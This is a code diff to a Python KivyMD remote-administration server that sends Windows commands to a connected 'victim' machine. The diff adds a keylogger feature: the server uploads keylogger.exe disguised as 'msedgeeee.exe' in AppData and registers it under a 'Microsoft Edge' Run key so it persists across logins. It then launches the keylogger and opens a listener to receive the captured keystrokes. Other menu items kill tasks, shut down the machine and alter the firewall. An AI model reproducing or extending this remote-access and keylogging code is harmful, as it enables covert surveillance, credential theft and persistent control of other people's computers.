@@ -3,7 +3,7 @@ import socket
 import threading
 import sys
 from functools import partial
-
+import time
 import kivy
 import kivymd
 from kivymd.app import MDApp
@@ -33,7 +33,7 @@ ScreenManager:
             size_hint_y: None
             height: self.texture_size[1]
             padding_y: "500"
-            
+
     MDScreen:
         name: "mainMenu"            
         ScrollView:
@@ -42,61 +42,49 @@ ScreenManager:
                     id: networkInfoBtn
                     text: "Network Info"
                     on_press: app.NetworkInfo()
-
                 OneLineListItem:
                     id: osInfoBtn
                     text: "OS Info"
                     on_press: app.OSInfo()
-
                 OneLineListItem:
                     id: gpuInfoBtn
                     text: "GPU Info"
                     on_press: app.GpuInfo()
-
                 OneLineListItem:
                     id: cpuBtn
                     text: "CPU Usage"
                     on_press: app.CpuUsage()
-
                 OneLineListItem:
                     id: taskBtn
                     text: "Task List"
                     on_press: app.Tasks()
-
                 OneLineListItem:
                     id: netserviceBtn
                     text: "Network Services"
                     on_press: app.Services()
-
                 OneLineListItem:
                     id: userInfoBtn
                     text: "User Information"
                     on_press: app.UserInfo()
-
                 OneLineListItem:
                     id: secPolicy
                     text: "Security Policy"
                     on_press: app.SecPolicy()
-
                 OneLineListItem:
                     id: memInfo
                     text: "Memory Information"
                     on_press: app.MemInfo()
-
         MDTextField:
             id: consoleField
             max_height: '200dp'
             hint_text: 'Console'
             multiline: True
-
         MDIconButton:
             icon: "spider-thread"
             md_bg_color: 'red'
             pos_hint: {"center_x": .95, "center_y": .1} 
             elevation_normal: 12
             on_press: app.DisruptionMenu()
-
-
     MDScreen:
         name: "disruptionMenu"
         ScrollView:
@@ -105,66 +93,73 @@ ScreenManager:
                     id: killTaskBtn
                     text: "Kill Task"
                     on_press: app.KillTask()
-                    
+
                 OneLineListItem:
                     id: shutDownBtn
                     text: "Shutdown"
                     on_press: app.Shutdown()
-                    
+
                 OneLineListItem:
                     id: fileCreateBtn
                     text: "File Creation Disruption"
                     on_press: app.FileCreate()
-                    
+
                 OneLineListItem:
                     id: firewallBtn
                     text: "Firewall"
                     on_press: app.Firewall()
-
+                    
                 OneLineListItem:
                     id: denyFileBtn
                     text: "Deny Files"
                     on_press: app.DenyFiles()
-                    
+
                 OneLineListItem:
                     id: openBrowser
                     text: "Open Browsers"
                     on_press: app.OpenBrowsers()
-
+                    
+                OneLineListItem:
+                    id: instkeyloggerBtn
+                    text: "Install Key Logger"
+                    on_press: app.KeyloggerInstall()
+                    
+                OneLineListItem:
+                    id: keyloggerBtn
+                    text: "Key Logger"
+                    on_press: app.KeyloggerInit()
         MDTextField:
             id: disruptConsoleField
             max_height: '200dp'
             hint_text: 'Console'
             multiline: True
-
         MDIconButton:
             icon: "menu"
             md_bg_color: 'lightblue'
             pos_hint: {"center_x": .95, "center_y": .1} 
             elevation_normal: 12
             on_press: app.MainMenu()
-
 <TaskKillContent>
     orientation: 'vertical'
     spacing: '12dp'
     size_hint_y: None
     height: '120dp'
-
     MDTextField:
         id: taskKillProcessID
         hint_text: 'Enter Process Name'
-
 <DenyFilesContent>
     orientation: 'vertical'
     spacing: '12dp'
     size_hint_y: None
     height: '120dp'
-
     MDTextField:
         id: denyFilesID
         hint_text: 'Enter File Path'
-        
+
 '''
+# Server IP and Port
+HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
+PORT = 21420
 
 class Main(MDApp):
     def build(self):
@@ -174,10 +169,6 @@ class Main(MDApp):
         return Builder.load_string(KV)
 
     def StartServer(self):
-        # Server IP and Port
-        HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
-        PORT = 21420
-
         # Start server with the given host and port given and listen for a client
         self.server = socket.socket()
         self.server.bind((HOST, PORT))
@@ -239,7 +230,7 @@ class Main(MDApp):
             recvsize2 = self.currConn.recv(1024).decode()
             output2 = self.currConn.recv(int(recvsize2)).decode()
 
-            #Get Processor Information
+            # Get Processor Information
             command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
             self.currConn.send(command.encode())
             recvsize3 = self.currConn.recv(1024).decode()
@@ -298,7 +289,7 @@ class Main(MDApp):
 
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
-            
+
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -317,7 +308,7 @@ class Main(MDApp):
             # Receive output from client
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()  # Still needs more buffer
-            
+
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -334,7 +325,7 @@ class Main(MDApp):
 
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
-            
+
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -344,14 +335,14 @@ class Main(MDApp):
         while True:
             # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             command = 'net accounts'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
-            
+
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -368,17 +359,17 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
-            
+
             # Available memory
             command = 'systeminfo | findstr /C:"Available Physical Memory"'
             self.currConn.send(command.encode())
             recvsize2 = self.currConn.recv(1024).decode()
             output2 = self.currConn.recv(int(recvsize2)).decode()
-            
+
             # Cache
             command = 'wmic cpu get L2CacheSize, L3CacheSize'
             self.currConn.send(command.encode())
-            print('Command sent to client: ', command)  
+            print('Command sent to client: ', command)
             recvsize3 = self.currConn.recv(1024).decode()
             output3 = self.currConn.recv(int(recvsize3)).decode()
 
@@ -437,23 +428,23 @@ class Main(MDApp):
     def DenyFiles(self):
         # Reset console
         self.root.ids.disruptConsoleField.text = ''
-        
+
         self.denyFilesDialog = MDDialog(
-            title = "File Path:",
-            type = "custom",
-            content_cls = DenyFilesContent(),
-            buttons = [
+            title="File Path:",
+            type="custom",
+            content_cls=DenyFilesContent(),
+            buttons=[
                 MDFlatButton(
-                    text = "CANCEL", on_press = lambda x: self.DismissDenyFilesDialog()
-                    ),
+                    text="CANCEL", on_press=lambda x: self.DismissDenyFilesDialog()
+                ),
                 MDFlatButton(
-                    text = "OK", on_press = lambda x: self.ExecuteDenyFiles()
-                    ),
-                ],
-            )
+                    text="OK", on_press=lambda x: self.ExecuteDenyFiles()
+                ),
+            ],
+        )
 
         self.denyFilesDialog.open()
-        
+
     def DismissDenyFilesDialog(self, *args):
         self.denyFilesDialog.dismiss(force=True)
 
@@ -509,25 +500,25 @@ class Main(MDApp):
             self.root.ids.disruptConsoleField.text = command
             break
 
-    #Kill Task Disruption
+    # Kill Task Disruption
     def KillTask(self):
         # Reset console
         self.root.ids.disruptConsoleField.text = ''
 
         self.killTaskDialog = MDDialog(
-            title = "Task Kill:",
-            type = "custom",
-            content_cls = TaskKillContent(),
-            buttons = [
+            title="Task Kill:",
+            type="custom",
+            content_cls=TaskKillContent(),
+            buttons=[
                 MDFlatButton(
-                    text = "CANCEL", on_press = lambda x: self.DismissKillTaskDialog()
-                    ),
+                    text="CANCEL", on_press=lambda x: self.DismissKillTaskDialog()
+                ),
                 MDFlatButton(
-                    text = "OK", on_press = lambda x: self.ExecuteKillTask()
-                    ),
-                ],
-            )
-        
+                    text="OK", on_press=lambda x: self.ExecuteKillTask()
+                ),
+            ],
+        )
+
         self.killTaskDialog.open()
 
     def DismissKillTaskDialog(self, *args):
@@ -538,12 +529,90 @@ class Main(MDApp):
             command = 'taskkill /im ' + self.killTaskDialog.content_cls.ids.taskKillProcessID.text + ' /F'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(8096).decode()
+            recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
             self.killTaskDialog.dismiss(force=True)
             break
+
+    # Fang's keylogging madness
+    def KeyloggerInstall(self):
+        tpath = "%USERPROFILE%\\AppData\\Local\\Microsoft\\msedgeeee.exe"
+        kpath = os.path.join(os.getcwd(), "keylogger.exe")
+        while True:
+            # Check if payload is already on the target machine
+            command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            recvsize = self.currConn.recv(1024).decode()
+            isExist = self.currConn.recv(int(recvsize)).decode()
+            # Send payload to target if it isn't there yet
+            if isExist.strip() == "False":
+                print("Sending keylogger payload to victim.")
+                # File transfer mode
+                self.currConn.send("ft_True".encode())
+                time.sleep(0.02)
+                # Send target path and size of file
+                self.currConn.send(str("echo " + tpath).encode())
+                self.currConn.send(str(os.path.getsize(kpath)).encode())
+                time.sleep(1)
+                # Send exe in packets with size 8192
+                f = open(kpath, 'rb')
+                bytesToSend = f.read(8192)
+                self.currConn.send(bytesToSend)
+                totalSent = len(bytesToSend)
+                while totalSent < os.path.getsize(kpath):
+                    bytesToSend = f.read(8192)
+                    totalSent = totalSent + len(bytesToSend)
+                    self.currConn.send(bytesToSend)
+                f.close()
+                print("[VICTIM]: ", self.currConn.recv(1024).decode())
+                time.sleep(0.05)
+                # Add payload to registry to run on login
+                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
+                self.currConn.send(command.encode())
+                print('Command sent to client: ', command)
+                recvsize = self.currConn.recv(1024).decode()
+                output = self.currConn.recv(int(recvsize)).decode()
+                print('Registry add: ', output)
+                # Run payload once
+                time.sleep(0.05)
+                self.currConn.send("exe_True".encode())
+                command = tpath
+                self.currConn.send(command.encode())
+                print('Command sent to client: ', command)
+                output2 = self.currConn.recv(1024).decode()
+                time.sleep(5)
+                print(f"Keylogger{output2}")
+            else:
+                print("Keylogger already installed on target machine.")
+            break
+
+    def KeyloggerInit(self):
+        threading.Thread(target=self.Keylogger).start() #figure out how to kill thread
+
+    def Keylogger(self):
+        # Connect to keylogger on port 47620
+        print("Waiting for victim to transmit keylog info.")
+        klserver = socket.socket()
+        klserver.bind((HOST, 47620))
+        klserver.listen()
+        while True:
+            conn, addr = klserver.accept()
+            print(f"Connection from {addr} established!")
+            while True:
+                keys = conn.recv(1024).decode()
+                if keys == "Key.ctrl_r":
+                    break  # instead of waiting for RCtrl, wanna use kivy toggle to break (terminate thread)
+                else:
+                    print(keys)
+            print("Connection closed.")
+            conn.close()
+            break
+
+
+
 
     def DisruptionMenu(self):
         self.root.current = "disruptionMenu"
@@ -551,11 +620,14 @@ class Main(MDApp):
     def MainMenu(self):
         self.root.current = "mainMenu"
 
+
 class DenyFilesContent(BoxLayout):
     pass
 
+
 class TaskKillContent(BoxLayout):
     pass
+
 
 if __name__ == '__main__':
     Main().run()
